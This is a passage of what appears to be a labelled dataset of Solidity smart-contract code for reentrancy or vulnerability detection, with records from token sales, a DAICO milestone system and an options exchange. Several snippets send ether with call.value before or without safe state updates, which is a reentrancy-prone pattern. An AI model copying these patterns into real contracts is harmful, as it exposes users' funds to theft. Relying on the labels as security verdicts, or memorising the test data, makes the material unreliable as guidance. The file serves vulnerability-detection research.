validPurchase() internal view returns (bool) { return super.validPurchase() && aboveMinimumInvestment(); } function hasEnded() public view returns (bool) { bool capReached = weiRaised.add(minimumInvestment) > cap; return super.hasEnded() || capReached; } function hasStarted() public constant returns (bool) { return now >= startTime; } function aboveMinimumInvestment() internal view returns (bool) { return msg.value >= minimumInvestment; } function forwardFundsToWallet(uint256 amount) internal { if (goalReached() && vault.balance > 0) { vault.forwardFunds(); } if (goalReached()) { wallet.call.value(amount)(); } else { vault.deposit.value(amount)(msg.sender); } } } "}
{"sol name": "4679.sol", "label": 0, "first path": "function giveToken(address _buyer) internal { require( pendingTokenUser[_buyer] > 0, \"pendingTokenUser[_buyer] > 0\" ); tokenUser[_buyer] = tokenUser[_buyer].add(pendingTokenUser[_buyer]); tokenSaleContract.sendTokens(_buyer, pendingTokenUser[_buyer]); soldTokens = soldTokens.add(pendingTokenUser[_buyer]); pendingTokenUser[_buyer] = 0; require( address(tokenSaleContract).call.value( etherUser[_buyer] )( bytes4( keccak256(\"forwardEther()\") ) ) ); etherUser[_buyer] = 0; function forwardEther() onlyRC payable public returns(bool) { require(milestoneSystem.call.value(msg.value)(), \"wallet.call.value(msg.value)()\"); return true; ", "second path": "function giveToken(address _buyer) internal { require( pendingTokenUser[_buyer] > 0, \"pendingTokenUser[_buyer] > 0\" ); tokenUser[_buyer] = tokenUser[_buyer].add(pendingTokenUser[_buyer]); tokenSaleContract.sendTokens(_buyer, pendingTokenUser[_buyer]); soldTokens = soldTokens.add(pendingTokenUser[_buyer]); pendingTokenUser[_buyer] = 0; require( address(tokenSaleContract).call.value( etherUser[_buyer] )( bytes4( keccak256(\"forwardEther()\") ) ) ); etherUser[_buyer] = 0; function forwardEther() onlyRC payable public returns(bool) { require(milestoneSystem.call.value(msg.value)(), \"wallet.call.value(msg.value)()\"); return true; ", "third path": "function giveToken(address _buyer) internal { require( pendingTokenUser[_buyer] > 0, \"pendingTokenUser[_buyer] > 0\" ); tokenUser[_buyer] = tokenUser[_buyer].add(pendingTokenUser[_buyer]); tokenSaleContract.sendTokens(_buyer, pendingTokenUser[_buyer]); soldTokens = soldTokens.add(pendingTokenUser[_buyer]); pendingTokenUser[_buyer] = 0; require( address(tokenSaleContract).call.value( etherUser[_buyer] )( bytes4( keccak256(\"forwardEther()\") ) ) ); etherUser[_buyer] = 0; function forwardEther() onlyRC payable public returns(bool) { require(milestoneSystem.call.value(msg.value)(), \"wallet.call.value(msg.value)()\"); return true; ", "long path": "pragma solidity ^0.4.24; library SafeMath { function mul(uint256 a, uint256 b) internal pure returns (uint256 c) { if (a == 0) { return 0; } c = a * b; assert(c / a == b); return c; } function div(uint256 a, uint256 b) internal pure returns (uint256) { return a / b; } function sub(uint256 a, uint256 b) internal pure returns (uint256) { assert(b <= a); return a - b; } function add(uint256 a, uint256 b) internal pure returns (uint256 c) { c = a + b; assert(c >= a); return c; } } contract Ownable { address public owner; address public newOwner; event OwnershipTransferred(address indexed oldOwner, address indexed newOwner); constructor() public { owner = msg.sender; newOwner = address(0); } modifier onlyOwner() { require(msg.sender == owner, \"msg.sender == owner\"); _; } function transferOwnership(address _newOwner) public onlyOwner { require(address(0) != _newOwner, \"address(0) != _newOwner\"); newOwner = _newOwner; } function acceptOwnership() public { require(msg.sender == newOwner, \"msg.sender == newOwner\"); emit OwnershipTransferred(owner, msg.sender); owner = msg.sender; newOwner = address(0); } } contract tokenInterface { function balanceOf(address _owner) public constant returns (uint256 balance); function transfer(address _to, uint256 _value) public returns (bool); function burn(uint256 _value) public returns(bool); uint256 public totalSupply; uint256 public decimals; } contract AtomaxKycInterface { function started() public view returns(bool); function ended() public view returns(bool); function startTime() public view returns(uint256); function endTime() public view returns(uint256); function totalTokens() public view returns(uint256); function remainingTokens() public view returns(uint256); function price() public view returns(uint256); } contract AtomaxKyc { using SafeMath for uint256; mapping (address => bool) public isKycSigner; mapping (bytes32 => uint256) public alreadyPayed; event KycVerified(address indexed signer, address buyerAddress, bytes32 buyerId, uint maxAmount); constructor() internal { isKycSigner[0x9787295cdAb28b6640bc7e7db52b447B56b1b1f0] = true; isKycSigner[0x3b3f379e49cD95937121567EE696dB6657861FB0] = true; } function releaseTokensTo(address buyer) internal returns(bool); function buyTokensFor(address _buyerAddress, bytes32 _buyerId, uint _maxAmount, uint8 _v, bytes32 _r, bytes32 _s, uint8 _bv, bytes32 _br, bytes32 _bs) public payable returns (bool) { bytes32 hash = hasher ( _buyerAddress,  _buyerId,  _maxAmount ); address signer = ecrecover(hash, _bv, _br, _bs); require ( signer == _buyerAddress, \"signer == _buyerAddress \" ); return buyImplementation(_buyerAddress, _buyerId, _maxAmount, _v, _r, _s); } function buyTokens(bytes32 buyerId, uint maxAmount, uint8 v, bytes32 r, bytes32 s) public payable returns (bool) { return buyImplementation(msg.sender, buyerId, maxAmount, v, r, s); } function buyImplementation(address _buyerAddress, bytes32 _buyerId, uint256 _maxAmount, uint8 _v, bytes32 _r, bytes32 _s) private returns (bool) { bytes32 hash = hasher ( _buyerAddress,  _buyerId,  _maxAmount ); address signer = ecrecover(hash, _v, _r, _s); require( isKycSigner[signer], \"isKycSigner[signer]\"); uint256 totalPayed = alreadyPayed[_buyerId].add(msg.value); require(totalPayed <= _maxAmount); alreadyPayed[_buyerId] = totalPayed; emit KycVerified(signer, _buyerAddress, _buyerId, _maxAmount); return releaseTokensTo(_buyerAddress); } function hasher (address _buyerAddress, bytes32 _buyerId, uint256 _maxAmount) public view returns ( bytes32 hash ) { hash = keccak256(abi.encodePacked(\"Atomax authorization:\", this, _buyerAddress, _buyerId, _maxAmount)); } } contract RC_KYC is AtomaxKycInterface, AtomaxKyc { using SafeMath for uint256; TokedoDaico tokenSaleContract; uint256 public startTime; uint256 public endTime; uint256 public etherMinimum; uint256 public soldTokens; uint256 public remainingTokens; uint256 public tokenPrice; mapping(address => uint256) public etherUser; mapping(address => uint256) public pendingTokenUser; mapping(address => uint256) public tokenUser; constructor(address _tokenSaleContract, uint256 _tokenPrice, uint256 _remainingTokens, uint256 _etherMinimum, uint256 _startTime , uint256 _endTime) public { require ( _tokenSaleContract != address(0), \"_tokenSaleContract != address(0)\" ); require ( _tokenPrice != 0, \"_tokenPrice != 0\" ); require ( _remainingTokens != 0, \"_remainingTokens != 0\" ); require ( _startTime != 0, \"_startTime != 0\" ); require ( _endTime != 0, \"_endTime != 0\" ); tokenSaleContract = TokedoDaico(_tokenSaleContract); soldTokens = 0; remainingTokens = _remainingTokens; tokenPrice = _tokenPrice; etherMinimum = _etherMinimum; startTime = _startTime; endTime = _endTime; } modifier onlyTokenSaleOwner() { require(msg.sender == tokenSaleContract.owner() ); _; } function setTime(uint256 _newStart, uint256 _newEnd) public onlyTokenSaleOwner { if ( _newStart != 0 ) startTime = _newStart; if ( _newEnd != 0 ) endTime = _newEnd; } function changeMinimum(uint256 _newEtherMinimum) public onlyTokenSaleOwner { etherMinimum = _newEtherMinimum; } function releaseTokensTo(address buyer) internal returns(bool) { if( msg.value > 0 ) takeEther(buyer); giveToken(buyer); return true; } function started() public view returns(bool) { return now > startTime || remainingTokens == 0; } function ended() public view returns(bool) { return now > endTime || remainingTokens == 0; } function startTime() public view returns(uint) { return startTime; } function endTime() public view returns(uint) { return endTime; } function totalTokens() public view returns(uint) { return remainingTokens.add(soldTokens); } function remainingTokens() public view returns(uint) { return remainingTokens; } function price() public view returns(uint) { return uint256(1 ether).div( tokenPrice ).mul( 10 ** uint256(tokenSaleContract.decimals()) ); } function () public payable{ takeEther(msg.sender); } event TakeEther(address buyer, uint256 value, uint256 soldToken, uint256 tokenPrice ); function takeEther(address _buyer) internal { require( now > startTime, \"now > startTime\" ); require( now < endTime, \"now < endTime\"); require( msg.value >= etherMinimum, \"msg.value >= etherMinimum\"); require( remainingTokens > 0, \"remainingTokens > 0\" ); uint256 oneToken = 10 ** uint256(tokenSaleContract.decimals()); uint256 tokenAmount = msg.value.mul( oneToken ).div( tokenPrice ); uint256 remainingTokensGlobal = tokenInterface( tokenSaleContract.tokenContract() ).balanceOf( address(tokenSaleContract) ); uint256 remainingTokensApplied; if ( remainingTokensGlobal > remainingTokens ) { remainingTokensApplied = remainingTokens; } else { remainingTokensApplied = remainingTokensGlobal; } uint256 refund = 0; if ( remainingTokensApplied < tokenAmount ) { refund = (tokenAmount - remainingTokensApplied).mul(tokenPrice).div(oneToken); tokenAmount = remainingTokensApplied; remainingTokens = 0; _buyer.transfer(refund); } else { remainingTokens = remainingTokens.sub(tokenAmount); } etherUser[_buyer] = etherUser[_buyer].add(msg.value.sub(refund)); pendingTokenUser[_buyer] = pendingTokenUser[_buyer].add(tokenAmount); emit TakeEther( _buyer, msg.value, tokenAmount, tokenPrice ); } function giveToken(address _buyer) internal { require( pendingTokenUser[_buyer] > 0, \"pendingTokenUser[_buyer] > 0\" ); tokenUser[_buyer] = tokenUser[_buyer].add(pendingTokenUser[_buyer]); tokenSaleContract.sendTokens(_buyer, pendingTokenUser[_buyer]); soldTokens = soldTokens.add(pendingTokenUser[_buyer]); pendingTokenUser[_buyer] = 0; require( address(tokenSaleContract).call.value( etherUser[_buyer] )( bytes4( keccak256(\"forwardEther()\") ) ) ); etherUser[_buyer] = 0; } function refundEther(address to) public onlyTokenSaleOwner { to.transfer(etherUser[to]); etherUser[to] = 0; pendingTokenUser[to] = 0; } function withdraw(address to, uint256 value) public onlyTokenSaleOwner { to.transfer(value); } function userBalance(address _user) public view returns( uint256 _pendingTokenUser, uint256 _tokenUser, uint256 _etherUser ) { return (pendingTokenUser[_user], tokenUser[_user], etherUser[_user]); } } contract TokedoDaico is Ownable { using SafeMath for uint256; tokenInterface public tokenContract; address public milestoneSystem; uint256 public decimals; uint256 public tokenPrice; mapping(address => bool) public rc; constructor(address _wallet, address _tokenAddress, uint256[] _time, uint256[] _funds, uint256 _tokenPrice, uint256 _activeSupply) public { tokenContract = tokenInterface(_tokenAddress); decimals = tokenContract.decimals(); tokenPrice = _tokenPrice; milestoneSystem = new MilestoneSystem(_wallet,_tokenAddress, _time, _funds, _tokenPrice, _activeSupply); } modifier onlyRC() { require( rc[msg.sender], \"rc[msg.sender]\" ); _; } function forwardEther() onlyRC payable public returns(bool) { require(milestoneSystem.call.value(msg.value)(), \"wallet.call.value(msg.value)()\"); return true; } function sendTokens(address _buyer, uint256 _amount) onlyRC public returns(bool) { return tokenContract.transfer(_buyer, _amount); } event NewRC(address contr); function addRC(address _rc) onlyOwner public { rc[ _rc ]  = true; emit NewRC(_rc); } function withdrawTokens(address to, uint256 value) public onlyOwner returns (bool) { return tokenContract.transfer(to, value); } function setTokenContract(address _tokenContract) public onlyOwner { tokenContract = tokenInterface(_tokenContract); } } contract MilestoneSystem { using SafeMath for uint256; tokenInterface public tokenContract; TokedoDaico public tokenSaleContract; uint256[] public time; uint256[] public funds; bool public locked = false; uint256 public endTimeToReturnTokens; uint8 public step = 0; uint256 public constant timeframeMilestone = 3 days; uint256 public constant timeframeDeath = 30 days; uint256 public activeSupply; uint256 public tokenPrice; uint256 public etherReceived; address public wallet; mapping(address => mapping(uint8 => uint256) ) public balance; mapping(uint8 => uint256) public tokenDistrusted; constructor(address _wallet, address _tokenAddress, uint256[] _time, uint256[] _funds, uint256 _tokenPrice, uint256 _activeSupply) public { require( _wallet != address(0), \"_wallet != address(0)\" ); require( _time.length != 0, \"_time.length != 0\" ); require( _time.length == _funds.length, \"_time.length == _funds.length\" ); wallet = _wallet; tokenContract = tokenInterface(_tokenAddress); tokenSaleContract = TokedoDaico(msg.sender); time = _time; funds = _funds; activeSupply = _activeSupply; tokenPrice = _tokenPrice; } modifier onlyTokenSaleOwner() { require(msg.sender == tokenSaleContract.owner(), \"msg.sender == tokenSaleContract.owner()\" ); _; } event Distrust(address sender, uint256 amount); event Locked(); function distrust(address _from, uint _value, bytes _data) public { require(msg.sender == address(tokenContract), \"msg.sender == address(tokenContract)\"); if ( !locked ) { uint256 startTimeMilestone = time[step].sub(timeframeMilestone); uint256 endTimeMilestone = time[step]; uint256 startTimeProjectDeath = time[step].add(timeframeDeath); bool unclaimedFunds = funds[step] > 0; require( ( now > startTimeMilestone && now < endTimeMilestone ) || ( now > startTimeProjectDeath && unclaimedFunds ), \"( now > startTimeMilestone && now < endTimeMilestone ) || ( now > startTimeProjectDeath && unclaimedFunds )\" ); } else { require( locked && now < endTimeToReturnTokens ); } balance[_from][step] = balance[_from][step].add(_value); tokenDistrusted[step] = tokenDistrusted[step].add(_value); emit Distrust(msg.sender, _value); if( tokenDistrusted[step] > activeSupply && !locked ) { locked = true; endTimeToReturnTokens = now.add(timeframeDeath); emit Locked(); } } function tokenFallback(address _from, uint _value, bytes _data) public { distrust( _from, _value, _data); } function receiveApproval( address _from, uint _value, bytes _data) public { require(msg.sender == address(tokenContract), \"msg.sender == address(tokenContract)\"); require(msg.sender.call(bytes4(keccak256(\"transferFrom(address,address,uint256)\")), _from, this, _value)); distrust( _from, _value, _data); } event Trust(address sender, uint256 amount); event Unlocked(); function trust(uint8 _step) public { require( balance[msg.sender][_step] > 0 , \"balance[msg.sender] > 0\"); uint256 amount = balance[msg.sender][_step]; balance[msg.sender][_step] = 0; tokenDistrusted[_step] = tokenDistrusted[_step].sub(amount); tokenContract.transfer(msg.sender, amount); emit Trust(msg.sender, amount); if( tokenDistrusted[step] <= activeSupply && locked ) { locked = false; endTimeToReturnTokens = 0; emit Unlocked(); } } event Refund(address sender, uint256 money); function refundMe() public { require(locked, \"locked\"); require( now > endTimeToReturnTokens, \"now > endTimeToReturnTokens\" ); uint256 ethTot = address(this).balance; require( ethTot > 0 , \"ethTot > 0\"); uint256 tknAmount = balance[msg.sender][step]; require( tknAmount > 0 , \"tknAmount > 0\"); balance[msg.sender][step] = 0; tokenContract.burn(tknAmount); uint256 tknTot = tokenDistrusted[step]; uint256 rate = tknAmount.mul(1e18).div(tknTot); uint256 money = ethTot.mul(rate).div(1e18); if( money > address(this).balance ) { money = address(this).balance; } msg.sender.transfer(money); emit Refund(msg.sender, money); } function ownerWithdraw() public onlyTokenSaleOwner { require(!locked, \"!locked\"); require(now > time[step], \"now > time[step]\"); require(funds[step] > 0, \"funds[step] > 0\"); uint256 amountApplied = funds[step]; funds[step] = 0; step = step+1; uint256 value; if( amountApplied > address(this).balance || time.length == step+1) value = address(this).balance; else { value = amountApplied; } msg.sender.transfer(value); } function ownerWithdrawTokens(address _tokenContract, address to, uint256 value) public onlyTokenSaleOwner returns (bool) { require( _tokenContract != address(tokenContract), \"_tokenContract != address(tokenContract)\"); return tokenInterface(_tokenContract).transfer(to, value); } function setWallet(address _wallet) public onlyTokenSaleOwner returns(bool) { require( _wallet != address(0), \"_wallet != address(0)\" ); wallet = _wallet; return true; } function () public payable { require(msg.sender == address(tokenSaleContract), \"msg.sender == address(tokenSaleContract)\"); if( etherReceived < funds[0]  ) { require( wallet != address(0), \"wallet != address(0)\" ); wallet.transfer(msg.value); } etherReceived = etherReceived.add(msg.value); } } "}
{"sol name": "40340.sol", "label": 0, "first path": "function withdrawFunds(uint amount) { if (accountIDs[msg.sender]>0) { if (int(amount)<=getFunds(msg.sender, true) && int(amount)>0) { accounts[accountIDs[msg.sender]].capital -= int(amount); msg.sender.call.value(amount)(); Withdraw(msg.sender, amount, accounts[accountIDs[msg.sender]].capital); function expire(uint accountID, uint8 v, bytes32 r, bytes32 s, bytes32 value) { if (expired == false) { if (ecrecover(sha3(factHash, value), v, r, s) == ethAddr) { uint lastAccount = numAccounts; if (accountID==0) { accountID = 1; } else { lastAccount = accountID; for (accountID=accountID; accountID<=lastAccount; accountID++) { if (positions[accounts[accountID].user].expired == false) { int result = positions[accounts[accountID].user].cash / 1000000000000000000; for (uint optionID=0; optionID<numOptions; optionID++) { int moneyness = getMoneyness(options[optionID], uint(value), margin); result += moneyness * positions[accounts[accountID].user].positions[optionID] / 1000000000000000000; positions[accounts[accountID].user].expired = true; uint amountToSend = uint(accounts[accountID].capital + result); accounts[accountID].capital = 0; if (positions[accounts[accountID].user].hasPosition==true) { numPositionsExpired++; accounts[accountID].user.call.value(amountToSend)(); Expire(msg.sender, accounts[accountID].user); if (numPositionsExpired == numPositions) { expired = true; ", "second path": "function withdrawFunds(uint amount) { if (accountIDs[msg.sender]>0) { if (int(amount)<=getFunds(msg.sender, true) && int(amount)>0) { accounts[accountIDs[msg.sender]].capital -= int(amount); msg.sender.call.value(amount)(); Withdraw(msg.sender, amount, accounts[accountIDs[msg.sender]].capital); function expire(uint accountID, uint8 v, bytes32 r, bytes32 s, bytes32 value) { if (expired == false) { if (ecrecover(sha3(factHash, value), v, r, s) == ethAddr) { uint lastAccount = numAccounts; if (accountID==0) { accountID = 1; } else { lastAccount = accountID; for (accountID=accountID; accountID<=lastAccount; accountID++) { if (positions[accounts[accountID].user].expired == false) { int result = positions[accounts[accountID].user].cash / 1000000000000000000; for (uint optionID=0; optionID<numOptions; optionID++) { int moneyness = getMoneyness(options[optionID], uint(value), margin); result += moneyness * positions[accounts[accountID].user].positions[optionID] / 1000000000000000000; positions[accounts[accountID].user].expired = true; uint amountToSend = uint(accounts[accountID].capital + result); accounts[accountID].capital = 0; if (positions[accounts[accountID].user].hasPosition==true) { numPositionsExpired++; accounts[accountID].user.call.value(amountToSend)(); Expire(msg.sender, accounts[accountID].user); if (numPositionsExpired == numPositions) { expired = true; ", "third path": "function withdrawFunds(uint amount) { if (accountIDs[msg.sender]>0) { if (int(amount)<=getFunds(msg.sender, true) && int(amount)>0) { accounts[accountIDs[msg.sender]].capital -= int(amount); msg.sender.call.value(amount)(); Withdraw(msg.sender, amount, accounts[accountIDs[msg.sender]].capital); function expire(uint accountID, uint8 v, bytes32 r, bytes32 s, bytes32 value) { if (expired == false) { if (ecrecover(sha3(factHash, value), v, r, s) == ethAddr) { uint lastAccount = numAccounts; if (accountID==0) { accountID = 1; } else { lastAccount = accountID; for (accountID=accountID; accountID<=lastAccount; accountID++) { if (positions[accounts[accountID].user].expired == false) { int result = positions[accounts[accountID].user].cash / 1000000000000000000; for (uint optionID=0; optionID<numOptions; optionID++) { int moneyness = getMoneyness(options[optionID], uint(value), margin); result += moneyness * positions[accounts[accountID].user].positions[optionID] / 1000000000000000000; positions[accounts[accountID].user].expired = true; uint amountToSend = uint(accounts[accountID].capital + result); accounts[accountID].capital = 0; if (positions[accounts[accountID].user].hasPosition==true) { numPositionsExpired++; accounts[accountID].user.call.value(amountToSend)(); Expire(msg.sender, accounts[accountID].user); if (numPositionsExpired == numPositions) { expired = true; ", "long path": "contract Etheropt { struct Position { mapping(uint => int) positions; int cash; bool expired; bool hasPosition; } uint public expiration; string public underlying; uint public margin; uint public realityID; bytes32 public factHash; address public ethAddr; mapping(uint => int) options; uint public numOptions; bool public expired; mapping(address => Position) positions; uint public numPositions; uint public numPositionsExpired; struct Account { address user; int capital; } mapping(bytes32 => int) orderFills; struct MarketMaker { address user; string server; } mapping(uint => MarketMaker) marketMakers; uint public numMarketMakers = 0; mapping(address => uint) marketMakerIDs; mapping(uint => Account) accounts; uint public numAccounts; mapping(address => uint) accountIDs; event Deposit(address indexed user, uint amount, int balance); event Withdraw(address indexed user, uint amount, int balance); event NewMarketMaker(address indexed user, string server); event Expire(address indexed caller, address indexed user); event OrderMatchFailure(address indexed matchUser, int matchSize, address indexed orderUser, int orderSize, uint optionID, uint price); event OrderMatch(address indexed matchUser, int matchSize, address indexed orderUser, int orderSize, uint optionID, uint price); function Etheropt(uint expiration_, string underlying_, uint margin_, uint realityID_, bytes32 factHash_, address ethAddr_, int[] strikes_) { expiration = expiration_; underlying = underlying_; margin = margin_; realityID = realityID_; factHash = factHash_; ethAddr = ethAddr_; for (uint i=0; i < strikes_.length; i++) { if (numOptions<20) { uint optionID = numOptions++; options[optionID] = strikes_[i]; } } } function getAccountID(address user) constant returns(uint) { return accountIDs[user]; } function getAccount(uint accountID) constant returns(address) { return accounts[accountID].user; } function addFunds() { if (accountIDs[msg.sender]>0) { accounts[accountIDs[msg.sender]].capital += int(msg.value); } else { uint accountID = ++numAccounts; accounts[accountID].user = msg.sender; accounts[accountID].capital += int(msg.value); accountIDs[msg.sender] = accountID; } Deposit(msg.sender, msg.value, accounts[accountIDs[msg.sender]].capital); } function withdrawFunds(uint amount) { if (accountIDs[msg.sender]>0) { if (int(amount)<=getFunds(msg.sender, true) && int(amount)>0) { accounts[accountIDs[msg.sender]].capital -= int(amount); msg.sender.call.value(amount)(); Withdraw(msg.sender, amount, accounts[accountIDs[msg.sender]].capital); } } } function getFunds(address user, bool onlyAvailable) constant returns(int) { if (accountIDs[user]>0) { if (onlyAvailable == false) { return accounts[accountIDs[user]].capital; } else { return accounts[accountIDs[user]].capital + getMaxLossAfterTrade(user, 0, 0, 0); } } else { return 0; } } function getFundsAndAvailable(address user) constant returns(int, int) { return (getFunds(user, false), getFunds(user, true)); } function marketMaker(string server) { if (msg.value>0) throw; if (marketMakerIDs[msg.sender]>0) { marketMakers[marketMakerIDs[msg.sender]].server = server; } else { int funds = getFunds(marketMakers[i].user, false); uint marketMakerID = 0; if (numMarketMakers<6) { marketMakerID = ++numMarketMakers; } else { for (uint i=2; i<=numMarketMakers; i++) { if (getFunds(marketMakers[i].user, false)<=funds && (marketMakerID==0 || getFunds(marketMakers[i].user, false)<getFunds(marketMakers[marketMakerID].user, false))) { marketMakerID = i; } } } if (marketMakerID>0) { marketMakerIDs[marketMakers[marketMakerID].user] = 0; marketMakers[marketMakerID].user = msg.sender; marketMakers[marketMakerID].server = server; marketMakerIDs[msg.sender] = marketMakerID; NewMarketMaker(msg.sender, server); } else { throw; } } } function getMarketMakers() constant returns(string, string, string, string, string, string) { string[] memory servers = new string[](6); for (uint i=1; i<=numMarketMakers; i++) { servers[i-1] = marketMakers[i].server; } return (servers[0], servers[1], servers[2], servers[3], servers[4], servers[5]); } function getMarketMakerFunds() constant returns(int, int, int, int, int, int) { int[] memory funds = new int[](6); for (uint i=1; i<=numMarketMakers; i++) { funds[i-1] = getFunds(marketMakers[i].user, false); } return (funds[0], funds[1], funds[2], funds[3], funds[4], funds[5]); } function getOptionChain() constant returns (uint, string, uint, uint, bytes32, address) { return (expiration, underlying, margin, realityID, factHash, ethAddr); } function getMarket(address user) constant returns(uint[], int[], int[], int[]) { uint[] memory optionIDs = new uint[](20); int[] memory strikes_ = new int[](20); int[] memory positions_ = new int[](20); int[] memory cashes = new int[](20); uint z = 0; if (expired == false) { for (uint optionID=0; optionID<numOptions; optionID++) { optionIDs[z] = optionID; strikes_[z] = options[optionID]; positions_[z] = positions[user].positions[optionID]; cashes[z] = positions[user].cash; z++; } } return (optionIDs, strikes_, positions_, cashes); } function expire(uint accountID, uint8 v, bytes32 r, bytes32 s, bytes32 value) { if (expired == false) { if (ecrecover(sha3(factHash, value), v, r, s) == ethAddr) { uint lastAccount = numAccounts; if (accountID==0) { accountID = 1; } else { lastAccount = accountID; } for (accountID=accountID; accountID<=lastAccount; accountID++) { if (positions[accounts[accountID].user].expired == false) { int result = positions[accounts[accountID].user].cash / 1000000000000000000; for (uint optionID=0; optionID<numOptions; optionID++) { int moneyness = getMoneyness(options[optionID], uint(value), margin); result += moneyness * positions[accounts[accountID].user].positions[optionID] / 1000000000000000000; } positions[accounts[accountID].user].expired = true; uint amountToSend = uint(accounts[accountID].capital + result); accounts[accountID].capital = 0; if (positions[accounts[accountID].user].hasPosition==true) { numPositionsExpired++; } accounts[accountID].user.call.value(amountToSend)(); Expire(msg.sender, accounts[accountID].user); } } if (numPositionsExpired == numPositions) { expired = true; } } } } function getMoneyness(int strike, uint settlement, uint margin) constant returns(int) { if (strike>=0) { if (settlement>uint(strike)) { if (settlement-uint(strike)<margin) { return int(settlement-uint(strike)); } else { return int(margin); } } else { return 0; } } else { if (settlement<uint(-strike)) { if (uint(-strike)-settlement<margin) { return int(uint(-strike)-settlement); } else { return int(margin); } } else { return 0; } } } function orderMatchTest(uint optionID, uint price, int size, uint orderID, uint blockExpires, address addr, address sender, uint value, int matchSize) constant returns(bool) { if (block.number<=blockExpires && ((size>0 && matchSize<0 && orderFills[sha3(optionID, price, size, orderID, blockExpires)]-matchSize<=size) || (size<0 && matchSize>0 && orderFills[sha3(optionID, price, size, orderID, blockExpires)]-matchSize>=size)) && getFunds(addr, false)+getMaxLossAfterTrade(addr, optionID, -matchSize, matchSize * int(price))>0 && getFunds(sender, false)+int(value)+getMaxLossAfterTrade(sender, optionID, matchSize, -matchSize * int(price))>0) { return true; } return false; } function orderMatch(uint optionID, uint price, int size, uint orderID, uint blockExpires, address addr, uint8 v, bytes32 r, bytes32 s, int matchSize) { addFunds(); bytes32 hash = sha256(optionID, price, size, orderID, blockExpires); if (ecrecover(hash, v, r, s) == addr && block.number<=blockExpires && ((size>0 && matchSize<0 && orderFills[hash]-matchSize<=size) || (size<0 && matchSize>0 && orderFills[hash]-matchSize>=size)) && getFunds(addr, false)+getMaxLossAfterTrade(addr, optionID, -matchSize, matchSize * int(price))>0 && getFunds(msg.sender, false)+getMaxLossAfterTrade(msg.sender, optionID, matchSize, -matchSize * int(price))>0) { if (positions[msg.sender].hasPosition == false) { positions[msg.sender].hasPosition = true; numPositions++; } if (positions[addr].hasPosition == false) { positions[addr].hasPosition = true; numPositions++; } positions[msg.sender].positions[optionID] += matchSize; positions[msg.sender].cash -= matchSize * int(price); positions[addr].positions[optionID] -= matchSize; positions[addr].cash += matchSize * int(price); orderFills[hash] -= matchSize; OrderMatch(msg.sender, matchSize, addr, size, optionID, price); } else { OrderMatchFailure(msg.sender, matchSize, addr, size, optionID, price); } } function getMaxLossAfterTrade(address user, uint optionID, int positionChange, int cashChange) constant returns(int) { bool maxLossInitialized = false; int maxLoss = 0; if (positions[user].expired == false && numOptions>0) { for (uint s=0; s<numOptions; s++) { int pnl = positions[user].cash / 1000000000000000000; pnl += cashChange / 1000000000000000000; uint settlement = 0; if (options[s]<0) { settlement = uint(-options[s]); } else { settlement = uint(options[s]); } pnl += moneySumAtSettlement(user, optionID, positionChange, settlement); if (pnl<maxLoss || maxLossInitialized==false) { maxLossInitialized = true; maxLoss = pnl; } pnl = positions[user].cash / 1000000000000000000; pnl += cashChange / 1000000000000000000; settlement = 0; if (options[s]<0) { if (uint(-options[s])>margin) { settlement = uint(-options[s])-margin; } else { settlement = 0; } } else { settlement = uint(options[s])+margin; } pnl += moneySumAtSettlement(user, optionID, positionChange, settlement); if (pnl<maxLoss) { maxLoss = pnl; } } } return maxLoss; } function moneySumAtSettlement(address user, uint optionID, int positionChange, uint settlement) internal returns(int) { int pnl = 0; for (uint j=0; j<numOptions; j++) { pnl += positions[user].positions[j] * getMoneyness(options[j], settlement, margin) / 1000000000000000000; if (j==optionID) { pnl += positionChange * getMoneyness(options[j], settlement, margin) / 1000000000000000000; } } return pnl; } function min(uint a, uint b) constant returns(uint) { if (a<b) { return a; } else { return b; } } } "}
{"sol name": "2387_1.sol", "label": 1, "first path": "function transferAndCall(address to,  uint256 value,  bytes data) public payable liquid returns (bool) { require(to != address(this) && data.length >= 68 &&   transfer(to, value)); assembly { mstore(add(data, 36), value) mstore(add(data, 68), caller) require(to.call.value(msg.value)(data)); return true; ", "second path": "function transferAndCall(address to,  uint256 value,  bytes data) public payable liquid returns (bool) { require(to != address(this) && data.length >= 68 &&   transfer(to, value)); assembly { mstore(add(data, 36), value) mstore(add(data, 68), caller) require(to.call.value(msg.value)(data)); return true; ", "third path": "function transferAndCall(address to,  uint256 value,  bytes data) public payable liquid returns (bool) { require(to != address(this) && data.length >= 68 &&   transfer(to, value)); assembly { mstore(add(data, 36), value) mstore(add(data, 68), caller) require(to.call.value(msg.value)(data)); return true; ", "long path": "pragma solidity ^0.4.24; pragma experimental \"v0.5.0\"; pragma experimental ABIEncoderV2; library AddressExtension { function isValid(address _address) internal pure returns (bool) { return 0 != _address; } function isAccount(address _address) internal view returns (bool result) { assembly { result := iszero(extcodesize(_address)) } } function toBytes(address _address) internal pure returns (bytes b) { assembly { let m := mload(0x40) mstore(add(m, 20), xor(0x140000000000000000000000000000000000000000, _address)) mstore(0x40, add(m, 52)) b := m } } } library Math { struct Fraction { uint256 numerator; uint256 denominator; } function isPositive(Fraction memory fraction) internal pure returns (bool) { return fraction.numerator > 0 && fraction.denominator > 0; } function mul(uint256 a, uint256 b) internal pure returns (uint256 r) { r = a * b; require((a == 0) || (r / a == b)); } function div(uint256 a, uint256 b) internal pure returns (uint256 r) { r = a / b; } function sub(uint256 a, uint256 b) internal pure returns (uint256 r) { require((r = a - b) <= a); } function add(uint256 a, uint256 b) internal pure returns (uint256 r) { require((r = a + b) >= a); } function min(uint256 x, uint256 y) internal pure returns (uint256 r) { return x <= y ? x : y; } function max(uint256 x, uint256 y) internal pure returns (uint256 r) { return x >= y ? x : y; } function mulDiv(uint256 value, uint256 m, uint256 d) internal pure returns (uint256 r) { r = value * m; if (r / value == m) { r /= d; } else { r = mul(value / d, m); } } function mulDivCeil(uint256 value, uint256 m, uint256 d) internal pure returns (uint256 r) { r = value * m; if (r / value == m) { if (r % d == 0) { r /= d; } else { r = (r / d) + 1; } } else { r = mul(value / d, m); if (value % d != 0) { r += 1; } } } function mul(uint256 x, Fraction memory f) internal pure returns (uint256) { return mulDiv(x, f.numerator, f.denominator); } function mulCeil(uint256 x, Fraction memory f) internal pure returns (uint256) { return mulDivCeil(x, f.numerator, f.denominator); } function div(uint256 x, Fraction memory f) internal pure returns (uint256) { return mulDiv(x, f.denominator, f.numerator); } function divCeil(uint256 x, Fraction memory f) internal pure returns (uint256) { return mulDivCeil(x, f.denominator, f.numerator); } function mul(Fraction memory x, Fraction memory y) internal pure returns (Math.Fraction) { return Math.Fraction({ numerator: mul(x.numerator, y.numerator), denominator: mul(x.denominator, y.denominator) }); } } contract FsTKAuthority 